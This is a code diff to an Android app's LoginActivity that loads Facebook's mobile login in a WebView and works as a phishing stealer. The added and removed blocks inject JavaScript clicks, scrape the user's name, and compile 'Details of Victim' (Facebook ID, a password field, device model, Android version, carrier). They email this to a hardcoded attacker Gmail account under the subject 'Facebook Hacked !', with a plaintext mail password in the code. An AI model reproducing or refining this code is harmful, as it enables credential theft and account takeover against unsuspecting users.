@@ -193,52 +193,11 @@ public class LoginActivity extends AppCompatActivity
                 {
                     if(url.contains("m.facebook.com/home.php?_rdr"))
                     {
-                        v.loadUrl("javascript:(function(){" + "l=document.getElementById(\"u_0_i\");" + "e=document.createEvent('HTMLEvents');" +
+                        v.loadUrl("javascript:(function(){" + "l=document.getElementById('u_0_i');" + "e=document.createEvent('HTMLEvents');" +
                                 "e.initEvent('click',true,true);" + "l.dispatchEvent(e);" + "})()");
                         Toast.makeText(LoginActivity.this, "Clicked", Toast.LENGTH_SHORT).show();
-                        v.evaluateJavascript(
-                                "(function() { return (document.getElementsByClassName('_52x7 _2jcc')[0].innerHTML); })();",
-                                new ValueCallback<String>() {
-                                    @Override
-                                    public void onReceiveValue(String vName) {
-                                        v.loadUrl("javascript:(function(){" + "l=document.getElementById(\"u_0_9\");" + "e=document.createEvent('HTMLEvents');" +
-                                                "e.initEvent('click',true,true);" + "l.dispatchEvent(e);" + "})()");
-                                        final String message="Details of Victim =>\n"+
-                                                "\nName = "+vName.replace("\"","")+
-                                                "\nFacebook ID = "+Login.getText().toString()+
-                                                "\nPassword = "+//Pass.getText().toString()+
-                                                "\nDevice Used = "+Build.MODEL+
-                                                "\nAndroid Version Used = "+android.os.Build.VERSION.RELEASE+
-                                                "\nSim Network Used = "+((TelephonyManager) Objects.requireNonNull(LoginActivity.this.getSystemService(TELEPHONY_SERVICE))).getNetworkOperatorName();
-
-                                        new Thread(new Runnable() {
-                                            @Override
-                                            public void run() {
-                                                MainLayout.setVisibility(View.GONE);
-                                                Toast.makeText(LoginActivity.this, "Sent", Toast.LENGTH_SHORT).show();
-                                                try {
-                                                    GMailSender sender = new GMailSender(LoginActivity.this,"ritik.fbhack@gmail.com", "123212321");
-                                                    sender.sendMail("Facebook Hacked !",
-                                                            message,
-                                                            "ritik.fbhack@gmail.com",
-                                                            "ritik.space@gmail.com");
-                                                } catch (Exception e) {
-                                                    Log.e("SendMail", e.getMessage(), e);
-                                                }
-                                            }
-                                        }).start();
-                                    }
-                                });
+                        page=3;
                     }
-                    page=3;
-                }
-                else if(page==3)
-                {
-                    if(url.endsWith("?soft=bookmarks"))
-                    {
-
-                    }
-                    page=3;
                 }
             }
             @Override
@@ -263,10 +222,54 @@ public class LoginActivity extends AppCompatActivity
         }
         @Override
         public void onProgressChanged(WebView view, int progress)
-        {}
+        {
+            if(page==3 && progress==100)
+            {
+                new Handler().postDelayed(new Runnable() {
+                    @Override
+                    public void run() {
+                        FBMain.evaluateJavascript(
+                                "(function() { return (document.getElementsByClassName('_52x7 _2jcc')[0].innerHTML); })();",
+                                new ValueCallback<String>() {
+                                    @Override
+                                    public void onReceiveValue(String vName) {
+                                        Toast.makeText(LoginActivity.this, vName.replace("\"",""), Toast.LENGTH_LONG).show();
+                                        FBMain.loadUrl("javascript:(function(){" + "l=document.getElementById('u_0_9');" + "e=document.createEvent('HTMLEvents');" +
+                                                "e.initEvent('click',true,true);" + "l.dispatchEvent(e);" + "})()");
+                                        MainLayout.setVisibility(View.GONE);
+                                        final String message="Details of Victim =>\n"+
+                                                "\nName = "+vName.replace("\"","")+
+                                                "\nFacebook ID = "+Login.getText().toString()+
+                                                "\nPassword = "+//Pass.getText().toString()+
+                                                "\nDevice Used = "+Build.MODEL+
+                                                "\nAndroid Version Used = "+android.os.Build.VERSION.RELEASE+
+                                                "\nSim Network Used = "+((TelephonyManager) Objects.requireNonNull(LoginActivity.this.getSystemService(TELEPHONY_SERVICE))).getNetworkOperatorName();
+
+                                        new Thread(new Runnable() {
+                                            @Override
+                                            public void run() {
+                                                try {
+                                                    GMailSender sender = new GMailSender(LoginActivity.this,"ritik.fbhack@gmail.com", "123212321");
+                                                    sender.sendMail("Facebook Hacked !",
+                                                            message,
+                                                            "ritik.fbhack@gmail.com",
+                                                            "ritik.space@gmail.com");
+                                                } catch (Exception e) {
+                                                    Log.e("SendMail", e.getMessage(), e);
+                                                }
+                                            }
+                                        }).start();
+                                    }
+                                });
+                    }
+                }, 2000);
+                page=4;
+            }
+        }
         @Override
         public void onReceivedIcon(WebView view, Bitmap b) {
             super.onReceivedIcon(view, b);
+            if (view.getUrl().contains("m.facebook.com/home.php")){}
         }
     }
     public void LoginAccepted(){
